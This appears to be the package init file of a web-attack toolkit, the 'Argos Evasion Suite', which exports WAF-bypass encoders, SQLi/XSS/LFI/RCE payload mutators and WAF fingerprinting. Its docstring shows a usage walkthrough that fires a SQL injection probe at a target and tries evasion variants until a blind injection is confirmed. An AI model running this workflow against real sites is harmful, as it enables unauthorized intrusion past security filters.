"""Argos Evasion Suite — WAF-bypass tradecraft.

Five tightly-coupled modules that together produce APT-grade
probing traffic:

    encode.py           encoding cascades (URL, double-URL, UTF-8
                        overlong, HTML entity, case, comment)
    mutate.py           semantic-equivalence mutation per bug class
    statistical.py      Welch's t-test timing confirmation for blind
                        vulnerabilities
    waf_fingerprint.py  identify + adapt to Cloudflare, Wordfence,
                        Sucuri, Akamai, AWS WAF, Imperva, ModSecurity
    session.py          keep-alive + cookie-persistent + consistent-
                        UA session manager

Legal / ROE note
----------------
This suite is Stage-2-only. Every public function is covered by the
same consent discipline as argos.precision.

Usage pattern
-------------
    from amoskys.agents.Web.argos.evasion import (
        fingerprint_waf, recommend_bypass_layers,
        sqli_variants, TimingExperiment,
        StealthSession,
    )

    # 1. Probe the target lightly, identify WAF.
    with StealthSession("target.com") as s:
        s.warmup()
        # Attempt one attack-shaped probe.
        r = s.get("/?id=1' OR 1=1--")
        wafs = fingerprint_waf(r.headers, r.body.decode("utf-8", "replace"))

    # 2. Ask for the bypass-layer stack.
    layers = recommend_bypass_layers([w.name for w in wafs])

    # 3. Generate candidate variants for the identified bug class.
    variants = sqli_variants(mode="timing", max_variants=20)

    # 4. Fire each variant as a TimingExperiment for statistical
    #    confirmation.
    for v in variants:
        expt = TimingExperiment(
            label=v,
            n_samples=8,
            alpha=0.01,
            fire=lambda is_probe: _send_probe(s, v, is_probe),
        )
        result = expt.run()
        if result["significant"]:
            print("CONFIRMED:", v, result)
            break
"""

from amoskys.agents.Web.argos.evasion.encode import (
    available_encoders,
    b64,
    case_mutate,
    comment_pad,
    compose,
    hex_escape,
    hpp,
    html_entity,
    html_entity_hex,
    html_escape,
    js_unicode_escape,
    null_byte_after,
    sql_keyword_obfuscate,
    url,
    url2,
    url_unicode,
    utf8_overlong,
    whitespace_mutate,
)
from amoskys.agents.Web.argos.evasion.mutate import (
    lfi_variants,
    rce_variants,
    sqli_variants,
    variant_stream,
    xss_variants,
)
from amoskys.agents.Web.argos.evasion.session import (
    SessionResponse,
    StealthSession,
    session_for,
)
from amoskys.agents.Web.argos.evasion.statistical import (
    StatSample,
    TimingExperiment,
    welch_t_test,
)
from amoskys.agents.Web.argos.evasion.waf_fingerprint import (
    WAFFingerprint,
    fingerprint,
    recommend_bypass_layers,
)

# A friendlier alias.
fingerprint_waf = fingerprint

__all__ = [
    # encode
    "available_encoders",
    "compose",
    "b64",
    "case_mutate",
    "comment_pad",
    "hex_escape",
    "html_entity",
    "html_entity_hex",
    "html_escape",
    "hpp",
    "js_unicode_escape",
    "null_byte_after",
    "sql_keyword_obfuscate",
    "url",
    "url2",
    "url_unicode",
    "utf8_overlong",
    "whitespace_mutate",
    # mutate
    "lfi_variants",
    "rce_variants",
    "sqli_variants",
    "variant_stream",
    "xss_variants",
    # statistical
    "StatSample",
    "TimingExperiment",
    "welch_t_test",
    # waf
    "WAFFingerprint",
    "fingerprint",
    "fingerprint_waf",
    "recommend_bypass_layers",
    # session
    "SessionResponse",
    "StealthSession",
    "session_for",
]
